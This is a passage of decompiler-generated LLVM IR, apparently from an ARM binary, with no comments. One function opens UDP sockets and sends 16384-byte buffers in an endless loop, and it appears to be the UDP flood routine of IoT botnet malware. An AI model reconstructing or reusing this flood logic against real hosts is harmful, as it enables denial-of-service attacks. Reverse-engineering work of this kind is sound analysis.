  %v5_cddc = inttoptr i32 %v4_cddc to i8*
  store i8 %v1_cdd4, i8* %v5_cddc, align 1
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v1_cde4 = load i32, i32* @r4, align 4
  %v9_cde4 = icmp eq i32 %v5_c7ec, %v1_cde4
  store i1 %v9_cde4, i1* %cpsr_z.global-to-local, align 1
  %v0_cde8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cde8 = trunc i32 %v0_cde8 to i8
  %v2_cde8 = load i32, i32* @r6, align 4
  %v3_cde8 = add i32 %v2_cde8, 3
  %v4_cde8 = inttoptr i32 %v3_cde8 to i8*
  store i8 %v1_cde8, i8* %v4_cde8, align 1
  %v0_cdec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdec, label %dec_label_pc_cdf0, label %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge

dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge:    ; preds = %dec_label_pc_cdd4
  %v1_cc58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc54

dec_label_pc_cdf0:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_cc48
  %v0_cdf0 = call i32 @function_fe60()
  store i32 %v0_cdf0, i32* %r0.global-to-local, align 4
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v1_cdf8 = load i32, i32* @r4, align 4
  %v9_cdf8 = icmp eq i32 %v6_c804, %v1_cdf8
  store i1 %v9_cdf8, i1* %cpsr_z.global-to-local, align 1
  %v1_cdfc = load i32, i32* @r6, align 4
  %v2_cdfc = add i32 %v1_cdfc, 4
  %v3_cdfc = inttoptr i32 %v2_cdfc to i32*
  store i32 %v0_cdf0, i32* %v3_cdfc, align 4
  br i1 %v9_cdf8, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  %v0_ce04 = call i32 @function_fe60()
  store i32 %v0_ce04, i32* %r0.global-to-local, align 4
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  %v1_ce10 = load i32, i32* @r6, align 4
  %v2_ce10 = add i32 %v1_ce10, 8
  %v3_ce10 = inttoptr i32 %v2_ce10 to i32*
  store i32 %v0_ce04, i32* %v3_ce10, align 4
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04
  %v0_ce18 = call i32 @function_fe60()
  %v1_ce18 = trunc i32 %v0_ce18 to i8
  store i32 %v0_ce18, i32* %r0.global-to-local, align 4
  %v4_ce1c = sdiv i32 %v0_ce18, 256
  store i32 %v4_ce1c, i32* %r3.global-to-local, align 4
  %v1_ce20 = trunc i32 %v4_ce1c to i8
  %v2_ce20 = load i32, i32* @r6, align 4
  %v3_ce20 = add i32 %v2_ce20, 19
  %v4_ce20 = inttoptr i32 %v3_ce20 to i8*
  store i8 %v1_ce20, i8* %v4_ce20, align 1
  %v3_ce24 = load i32, i32* @r6, align 4
  %v4_ce24 = add i32 %v3_ce24, 18
  %v5_ce24 = inttoptr i32 %v4_ce24 to i8*
  store i8 %v1_ce18, i8* %v5_ce24, align 1
  br label %dec_label_pc_cc6c

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_c8d4
  %v0_ce2c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ce2c, i32* %r0.global-to-local, align 4
  %v1_ce30 = call i32 @function_13654(i32 %v0_ce2c)
  store i32 %v1_ce30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_c6fc, %dec_label_pc_ce2c
  %v29_ce38 = phi i32 [ %v3_c8c4, %dec_label_pc_c6fc ], [ %v1_ce30, %dec_label_pc_ce2c ]
  store i32 %v3_c6fc, i32* %r4.global-to-local, align 4
  store i32 %v12_c6fc, i32* %r7.global-to-local, align 4
  ret i32 %v29_ce38

; uselistorder directives
  uselistorder i32 %v4_ce1c, { 1, 0 }
  uselistorder i32 %v0_ce18, { 0, 2, 1 }
  uselistorder i32 %v0_cdb8, { 0, 2, 1 }
  uselistorder i32 %v0_cd9c, { 0, 2, 1 }
  uselistorder i32 %v2_cd70, { 1, 0 }
  uselistorder i32 %v8_cd50, { 2, 0, 1, 3 }
  uselistorder i32 %v3_cd3c, { 1, 0 }
  uselistorder i32 %v0_cd2c, { 1, 0, 2, 3 }
  uselistorder i1 %v2_cd0c, { 1, 0 }
  uselistorder i32 %v0_cd00, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ccfc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_cca4, { 0, 2, 1 }
  uselistorder i32 %v0_cc8c, { 1, 0, 2 }
  uselistorder i1 %v7_cc14, { 2, 1, 0 }
  uselistorder i1 %v2_ce0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_cd90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cbc8, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c9e0, { 1, 0 }
  uselistorder i32 %v1_c9c0, { 1, 0 }
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v1_c9ac, { 1, 0 }
  uselistorder i32 %v1_c9a8, { 1, 0 }
  uselistorder i32 %v3_c998, { 1, 0 }
  uselistorder i32 %v1_c988, { 1, 0 }
  uselistorder i32 %v1_c980, { 1, 0 }
  uselistorder i32 %v1_c95c, { 1, 0 }
  uselistorder i32 %v1_c958, { 1, 0 }
  uselistorder i32 %v1_c950, { 1, 0 }
  uselistorder i32 %v1_c924, { 2, 1, 3, 0 }
  uselistorder i32 %v3_c918, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c914, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c910, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_c8f4, { 1, 0 }
  uselistorder i1 %v7_c8c8, { 1, 0 }
  uselistorder i32 %v3_c8c4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c8b0, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_c804, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c7ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c79c, { 1, 0 }
  uselistorder i32 %v5_c734, { 1, 0 }
  uselistorder i32 %v1_c700, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 6, 4, 7, 8, 10, 9, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 34, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 254, { 0, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11, 7, 12 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce18, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbe0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ce40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ce40:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v24_ce40 = load i32, i32* @fp, align 4
  %v1_ce44 = urem i32 %arg1, 256
  store i32 %v1_ce44, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_ce5c = urem i32 %arg3, 256
  store i32 %v1_ce5c, i32* @r4, align 4
  %v2_ce60 = call i32 @function_14254(i32 %v1_ce44, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_ce60, i32* @sl, align 4
  %v0_ce6c = load i32, i32* @r7, align 4
  %v2_ce70 = call i32 @function_14254(i32 %v0_ce6c, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_ce7c = load i32, i32* @r6, align 4
  store i32 %v0_ce7c, i32* %r1.global-to-local, align 4
  store i32 %v2_ce70, i32* @sb, align 4
  %v0_ce8c = load i32, i32* @r4, align 4
  %v4_ce90 = inttoptr i32 %v0_ce7c to i32*
  %v5_ce90 = call i32 @function_a4e8(i32 %v0_ce8c, i32* %v4_ce90, i32 7, i32 65535)
  %v3_ce98 = urem i32 %v5_ce90, 65536
  %v0_ce9c = load i32, i32* @r6, align 4
  store i32 %v0_ce9c, i32* %r1.global-to-local, align 4
  %v0_cea4 = load i32, i32* @r5, align 4
  %v0_cea8 = load i32, i32* @r4, align 4
  %v5_ceb0 = inttoptr i32 %v0_ce9c to i32*
  %v6_ceb0 = call i32 @function_a4e8(i32 %v0_cea8, i32* %v5_ceb0, i32 6, i32 %v0_cea4)
  %v0_ceb4 = load i32, i32* @r6, align 4
  store i32 %v0_ceb4, i32* %r1.global-to-local, align 4
  %v3_ceb8 = mul i32 %v6_ceb0, 65536
  store i32 %v3_ceb8, i32* %fp.global-to-local, align 4
  %v0_cec4 = load i32, i32* @r4, align 4
  %v4_cec8 = inttoptr i32 %v0_ceb4 to i32*
  %v5_cec8 = call i32 @function_a4e8(i32 %v0_cec4, i32* %v4_cec8, i32 0, i32 512)
  %v0_ced4 = load i32, i32* @r6, align 4
  store i32 %v0_ced4, i32* %r1.global-to-local, align 4
  %v0_ced8 = load i32, i32* @r4, align 4
  %v3_cee0 = urem i32 %v5_cec8, 65536
  store i32 %v3_cee0, i32* @r6, align 4
  %v4_cee4 = inttoptr i32 %v0_ced4 to i32*
  %v5_cee4 = call i32 @function_a4e8(i32 %v0_ced8, i32* %v4_cee4, i32 1, i32 1)
  %v0_cee8 = load i32, i32* %fp.global-to-local, align 4
  %v3_cee8 = udiv i32 %v0_cee8, 65536
  %v1_cef0 = load i32, i32* @r5, align 4
  %v9_cef0 = icmp eq i32 %v3_cee8, %v1_cef0
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_cef0, label %dec_label_pc_cf18, label %bb

bb:                                               ; preds = %dec_label_pc_ce40
  %v2_cf04 = mul nuw nsw i32 %v3_cee8, 256
  %v4_cf08 = and i32 %v2_cf04, 65280
  %v1_cf0c = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c, i32* @r8, align 4
  %v5_cf10 = udiv i32 %v0_cee8, 16777216
  %v6_cf10 = or i32 %v4_cf08, %v5_cf10
  br label %dec_label_pc_cf24

dec_label_pc_cf18:                                ; preds = %dec_label_pc_ce40
  %v1_cf0c7 = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c7, i32* @r8, align 4
  %v0_cf18 = call i32 @function_fe60()
  %v3_cf20 = urem i32 %v0_cf18, 65536
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %bb, %dec_label_pc_cf18
  %storemerge17 = phi i32 [ %v6_cf10, %bb ], [ %v3_cf20, %dec_label_pc_cf18 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_cf24 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_cf24, 1
  br i1 %tmp41, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_cf2c

dec_label_pc_d0cc.preheader:                      ; preds = %dec_label_pc_d028, %dec_label_pc_cf24
  %storemerge3.in12.ph = phi i32 [ %v0_cf24, %dec_label_pc_cf24 ], [ %v1_cf80, %dec_label_pc_d028 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cf24
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v3_cf30 = udiv i32 %v5_ce90, 256
  %v5_cf3c = trunc i32 %v3_cf30 to i8
  store i32 %arg2, i32* @r5, align 4
  %v3_cf54 = udiv i32 %v5_ce90, 65536
  store i32 %v3_cf54, i32* @r4, align 4
  %v4_cf64 = trunc i32 %v3_cf54 to i8
  store i8 %v4_cf64, i8* %stack_var_-80, align 1
  %v3_d074 = icmp eq i32 %v3_ce98, 65535
  %v2_cf9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_cfcc = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_d058

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_d058
  %v2_cf6c = load i8, i8* %stack_var_-80, align 1
  %v3_cf6c = sext i8 %v2_cf6c to i32
  store i32 %v3_cf6c, i32* %r1.global-to-local, align 4
  store i32 %v3_cf30, i32* @r4, align 4
  %v2_cf70 = load i32, i32* @r5, align 4
  %v3_cf70 = add i32 %v2_cf70, 2
  %v4_cf70 = inttoptr i32 %v3_cf70 to i8*
  store i8 %v5_cf3c, i8* %v4_cf70, align 1
  %v0_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i8
  %v2_cf74 = load i32, i32* @r5, align 4
  %v3_cf74 = add i32 %v2_cf74, 3
  %v4_cf74 = inttoptr i32 %v3_cf74 to i8*
  store i8 %v1_cf74, i8* %v4_cf74, align 1
  br label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf6c
  %v1_cf80 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_cf90 = call i32 @function_13f50(i32 2, i32 2, i32 17)
  store i32 %stack_var_-60.0, i32* @r4, align 4
  %v7_cf98 = icmp eq i32 %v3_cf90, -1
  store i32 %v2_cf9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v2_cfac = load i32, i32* @sb, align 4
  %v3_cfac = add i32 %v2_cfac, %stack_var_-60.0
  %v4_cfac = inttoptr i32 %v3_cfac to i32*
  store i32 %v3_cf90, i32* %v4_cfac, align 4
  br i1 %v7_cf98, label %dec_label_pc_d0d8, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_cf78
  store i32 2, i32* %stack_var_-52, align 4
  %v4_cfcc = call i32 @function_13d80(i32 %v3_cf90, %sockaddr* %v3_cfcc, i32 16)
  %v0_cfd0 = load i32, i32* @r5, align 4
  %v1_cfd0 = add i32 %v0_cfd0, 20
  %v2_cfd0 = inttoptr i32 %v1_cfd0 to i8*
  %v3_cfd0 = load i8, i8* %v2_cfd0, align 1
  %tmp = icmp ugt i8 %v3_cfd0, 31
  br i1 %tmp, label %dec_label_pc_d028, label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfb4
  %v1_cfdc = add i32 %v0_cfd0, 16
  %v2_cfdc = inttoptr i32 %v1_cfdc to i32*
  %v3_cfdc = load i32, i32* %v2_cfdc, align 4
  store i32 %v3_cfdc, i32* @r4, align 4
  %v0_cfe0 = call i32 @function_fe60()
  %v0_cfe4 = load i32, i32* @r4, align 4
  %v1_cfe8 = and i32 %v0_cfe4, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v1_cfe4 = udiv i32 %v0_cfe4, 256
  %v3_cfec = and i32 %v1_cfe4, 65280
  %v3_cff0 = mul i32 %v0_cfe4, 16777216
  %v4_cff4 = mul i32 %v1_cfe8, 256
  %v5_cff4 = or i32 %v4_cff4, %v3_cff0
  store i32 %v5_cff4, i32* %r1.global-to-local, align 4
  %v4_cff8 = udiv i32 %v0_cfe4, 16777216
  %v5_cff8 = or i32 %v3_cfec, %v4_cff8
  %v0_cffc = load i32, i32* @r5, align 4
  %v1_cffc = add i32 %v0_cffc, 20
  %v2_cffc = inttoptr i32 %v1_cffc to i8*
  %v3_cffc = load i8, i8* %v2_cffc, align 1
  %v4_cffc = zext i8 %v3_cffc to i32
  %v2_d000 = or i32 %v5_cff4, %v5_cff8
  %v7_d004 = lshr i32 %v0_cfe0, %v4_cffc
  %v8_d004 = add i32 %v7_d004, %v2_d000
  %v3_d010 = mul i32 %v8_d004, 16777216
  %v1_d014 = and i32 %v8_d004, 65280
  %v4_d018 = mul nuw nsw i32 %v1_d014, 256
  %v5_d018 = or i32 %v4_d018, %v3_d010
  store i32 %v5_d018, i32* %r1.global-to-local, align 4
  %v2_d020 = call i32 @llvm.bswap.i32(i32 %v8_d004)
  %v2_d024 = add i32 %v0_cffc, 4
  %v3_d024 = inttoptr i32 %v2_d024 to i32*
  store i32 %v2_d020, i32* %v3_d024, align 4
  %v0_d034.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cfb4, %dec_label_pc_cfdc
  %v0_d034 = phi i32 [ %v0_cfd0, %dec_label_pc_cfb4 ], [ %v0_d034.pre, %dec_label_pc_cfdc ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_d030 = load i32, i32* @sb, align 4
  %v2_d030 = add i32 %v1_d030, %stack_var_-60.0
  %v3_d030 = inttoptr i32 %v2_d030 to i32*
  %v4_d030 = load i32, i32* %v3_d030, align 4
  store i32 %v0_d034, i32* %r1.global-to-local, align 4
  %v3_d038 = inttoptr i32 %v0_d034 to %sockaddr*
  %v4_d038 = call i32 @function_13dac(i32 %v4_d030, %sockaddr* %v3_d038, i32 16)
  %v1_d044 = add i32 %stack_var_-60.0, 4
  %v1_d048 = load i32, i32* @r7, align 4
  %v9_d048 = icmp eq i32 %v1_cf80, %v1_d048
  %v0_d050 = load i32, i32* @r5, align 4
  %v1_d050 = add i32 %v0_d050, 24
  store i32 %v1_d050, i32* @r5, align 4
  br i1 %v9_d048, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_d058

dec_label_pc_d058:                                ; preds = %dec_label_pc_d028, %dec_label_pc_cf2c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_d044, %dec_label_pc_d028 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_cf80, %dec_label_pc_d028 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d064 = call i32 @function_14254(i32 65535, i32 1)
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v2_d078 = load i32, i32* @sl, align 4
  %v3_d078 = add i32 %v2_d078, %stack_var_-60.0
  %v4_d078 = inttoptr i32 %v3_d078 to i32*
  store i32 %v2_d064, i32* %v4_d078, align 4
  br i1 %v3_d074, label %dec_label_pc_d080, label %dec_label_pc_cf6c

dec_label_pc_d080:                                ; preds = %dec_label_pc_d058
  %v0_d080 = call i32 @function_fe60()
  %v1_d080 = trunc i32 %v0_d080 to i8
  %v4_d084 = sdiv i32 %v0_d080, 256
  %v1_d088 = trunc i32 %v4_d084 to i8
  %v2_d088 = load i32, i32* @r5, align 4
  %v3_d088 = add i32 %v2_d088, 3
  %v4_d088 = inttoptr i32 %v3_d088 to i8*
  store i8 %v1_d088, i8* %v4_d088, align 1
  %v3_d08c = load i32, i32* @r5, align 4
  %v4_d08c = add i32 %v3_d08c, 2
  %v5_d08c = inttoptr i32 %v4_d08c to i8*
  store i8 %v1_d080, i8* %v5_d08c, align 1
  br label %dec_label_pc_cf78

dec_label_pc_d094:                                ; preds = %dec_label_pc_d0cc.loopexit, %dec_label_pc_d0cc.preheader, %dec_label_pc_d0d0.loopexit, %dec_label_pc_d094
  br label %dec_label_pc_d094

dec_label_pc_d098:                                ; preds = %dec_label_pc_d098.lr.ph, %dec_label_pc_d0d0.loopexit
  %v0_d098 = load i32, i32* @r8, align 4
  %v2_d098 = icmp eq i32 %v0_d098, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_d098, label %dec_label_pc_d0a0, label %dec_label_pc_d0e0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d0a8

dec_label_pc_d0a8:                                ; preds = %dec_label_pc_d0a8, %dec_label_pc_d0a0
  %v0_d0b0 = phi i32 [ %v1_d0b0, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v0_d0a8 = phi i32 [ %v1_d0c4, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v1_d0a8 = load i32, i32* @sb, align 4
  %v2_d0a8 = add i32 %v1_d0a8, %v0_d0a8
  %v3_d0a8 = inttoptr i32 %v2_d0a8 to i32*
  %v4_d0a8 = load i32, i32* %v3_d0a8, align 4
  %v1_d0ac = load i32, i32* @sl, align 4
  %v2_d0ac = add i32 %v1_d0ac, %v0_d0a8
  %v3_d0ac = inttoptr i32 %v2_d0ac to i32*
  %v4_d0ac = load i32, i32* %v3_d0ac, align 4
  store i32 %v4_d0ac, i32* %r1.global-to-local, align 4
  %v1_d0b0 = add i32 %v0_d0b0, 1
  %v0_d0b4 = load i32, i32* @r6, align 4
  %v4_d0bc = inttoptr i32 %v4_d0ac to i32*
  %v5_d0bc = call i32 @function_13ec0(i32 %v4_d0a8, i32* %v4_d0bc, i32 %v0_d0b4, i32 16384)
  %v1_d0c0 = load i32, i32* @r7, align 4
  %v9_d0c0 = icmp eq i32 %v1_d0b0, %v1_d0c0
  %v0_d0c4 = load i32, i32* @r4, align 4
  %v1_d0c4 = add i32 %v0_d0c4, 4
  store i32 %v1_d0c4, i32* @r4, align 4
  br i1 %v9_d0c0, label %dec_label_pc_d0cc.loopexit, label %dec_label_pc_d0a8

dec_label_pc_d0cc.loopexit:                       ; preds = %dec_label_pc_d0a8
  %tmp4247 = icmp slt i32 %v1_d0b0, 1
  br i1 %tmp4247, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_d098.lr.ph:                          ; preds = %dec_label_pc_d0cc.preheader, %dec_label_pc_d0cc.loopexit
  br label %dec_label_pc_d098

dec_label_pc_d0d0.loopexit:                       ; preds = %dec_label_pc_d0e8
  %tmp42 = icmp slt i32 %v0_d110, 1
  br i1 %tmp42, label %dec_label_pc_d094, label %dec_label_pc_d098

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_cf78
  store i32 %v24_ce40, i32* %fp.global-to-local, align 4
  ret i32 %v3_cf90

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_d0e8

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_d0e8, %dec_label_pc_d0e0
  %v0_d0e8 = phi i32 [ %v1_d114, %dec_label_pc_d0e8 ], [ 0, %dec_label_pc_d0e0 ]
  %v1_d0e8 = load i32, i32* @sl, align 4
  %v2_d0e8 = add i32 %v1_d0e8, %v0_d0e8
  %v3_d0e8 = inttoptr i32 %v2_d0e8 to i32*
  %v4_d0e8 = load i32, i32* %v3_d0e8, align 4
  store i32 %v4_d0e8, i32* @r4, align 4
  %v0_d0ec = load i32, i32* @r6, align 4
  store i32 %v0_d0ec, i32* @r1, align 4
  %v1_d0f4 = inttoptr i32 %v4_d0e8 to i8*
  %v2_d0f4 = call i32 @function_1003c(i8* %v1_d0f4)
  %v0_d0f8 = load i32, i32* @r5, align 4
  %v1_d0f8 = add i32 %v0_d0f8, 1
  store i32 %v1_d0f8, i32* @r5, align 4
  %v0_d0fc = load i32, i32* @fp, align 4
  %v1_d0fc = load i32, i32* @sb, align 4
  %v2_d0fc = add i32 %v1_d0fc, %v0_d0fc
  %v3_d0fc = inttoptr i32 %v2_d0fc to i32*
  %v4_d0fc = load i32, i32* %v3_d0fc, align 4
  %v0_d100 = load i32, i32* @r4, align 4
  store i32 %v0_d100, i32* %r1.global-to-local, align 4
  %v0_d104 = load i32, i32* @r6, align 4
  %v4_d10c = inttoptr i32 %v0_d100 to i32*
  %v5_d10c = call i32 @function_13ec0(i32 %v4_d0fc, i32* %v4_d10c, i32 %v0_d104, i32 16384)
  %v0_d110 = load i32, i32* @r5, align 4
  %v1_d110 = load i32, i32* @r7, align 4
  %v9_d110 = icmp eq i32 %v0_d110, %v1_d110
  %v0_d114 = load i32, i32* @fp, align 4
  %v1_d114 = add i32 %v0_d114, 4
  store i32 %v1_d114, i32* @fp, align 4
  br i1 %v9_d110, label %dec_label_pc_d0d0.loopexit, label %dec_label_pc_d0e8

; uselistorder directives
  uselistorder i32 %v1_d114, { 1, 0 }
  uselistorder i32 %v0_d110, { 1, 0 }
  uselistorder i32 %v1_d0c4, { 1, 0 }
  uselistorder i32 %v1_d0b0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_d034, { 1, 0 }
  uselistorder i32 %v8_d004, { 1, 2, 0 }
  uselistorder i32 %v0_cfe4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cf90, { 1, 3, 2, 0 }
  uselistorder i32 %v1_cf80, { 1, 2, 0 }
  uselistorder i32 %v3_cf54, { 1, 0 }
  uselistorder i32 %v3_cf30, { 1, 0 }
  uselistorder i32 %v3_ce98, { 0, 2, 1 }
  uselistorder i32 %v1_ce44, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_d098.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_d098, { 1, 0 }
  uselistorder label %dec_label_pc_d094, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_d028, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
}

define i32 @function_d124(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d124:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v18_d124 = load i32, i32* @sb, align 4
  %v24_d124 = load i32, i32* @fp, align 4
  %v1_d128 = urem i32 %arg1, 256
  store i32 %v1_d128, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d128, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d140 = urem i32 %arg3, 256
  store i32 %v1_d140, i32* @r4, align 4
  %v2_d144 = call i32 @function_14254(i32 %v1_d128, i32 4)
  %v0_d148 = load i32, i32* @r5, align 4
  store i32 %v0_d148, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d158 = load i32, i32* @r4, align 4
  store i32 %v0_d158, i32* %r0.global-to-local, align 4
  %v5_d15c = inttoptr i32 %v0_d148 to i32*
  %v6_d15c = call i32 @function_a4e8(i32 %v0_d158, i32* %v5_d15c, i32 2, i32 0)
  %v1_d168 = urem i32 %v6_d15c, 256
  store i32 %v1_d168, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d174 = load i32, i32* @r5, align 4
  store i32 %v0_d174, i32* %r1.global-to-local, align 4
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 %v0_d178, i32* %r0.global-to-local, align 4
  %v5_d17c = trunc i32 %v6_d15c to i8
  %v6_d180 = inttoptr i32 %v0_d174 to i32*
  %v7_d180 = call i32 @function_a4e8(i32 %v0_d178, i32* %v6_d180, i32 3, i32 65535)
  %v0_d184 = load i32, i32* @r5, align 4
